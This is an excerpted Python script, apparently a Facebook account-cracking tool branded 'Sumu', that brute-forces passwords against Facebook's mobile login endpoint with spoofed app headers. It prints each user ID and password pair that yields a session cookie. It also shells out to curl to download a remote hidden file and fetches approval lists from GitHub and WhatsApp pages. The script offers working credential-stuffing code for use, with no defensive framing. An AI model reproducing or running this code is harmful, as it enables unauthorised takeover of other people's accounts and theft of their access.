...
r1=requests.get("https://github.com/AyeshaSumu/File1/blob/main/ApprovemXD.txt").text
...
if not os.path.isfile('.agents.txt'):
	...
	os.system('curl -L https://github.com/MARKSINGH1/Sumu.py.git/files/main/.agents.txt > .agents.txt')
...
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quSumuty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
...
def main():
	...
	print("\033[1;92m\t│\033[1;92mWELLCOME TO Sumu 2.8     \033[1;92m      │")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mSumu\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		...
		for pw in _sempak_:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/vSumudate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)

			if 'c_user' in ses.cookies.get_dict():

				print('\r\033[1;37m[\033[1;32mSumu-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;36mSumu PROCESS HAS BEEN STARTED')
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mSumu\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
...
=================================================
    ...
    [-] AUTHOR    :\033[1;32m Sumu

    [-] GITHUB    :\033[1;32m Sumu2018

    [-] WhatsApp  :\033[1;32m 01820000000
...
urls="https://business.facebook.com/busine"
...
def xoshnaw():
	...
	try:
		...
		httpCaht = requests.get("https://chat.whatsapp.com/BCHArq6cYSXCZ").text
		...
		if id in httpCaht:
			...
			os.system('xdg-open https://youtube.com/@Aal3056')
